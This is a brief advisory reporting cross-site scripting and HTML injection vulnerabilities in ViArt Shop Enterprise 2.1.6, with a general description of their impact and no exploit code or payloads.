ViArt Shop is affected by multiple cross-site scripting and HTML injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.

Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.

These issues are reported to affect ViArt Shop Enterprise version 2.1.6; other versions may also be vulnerable.
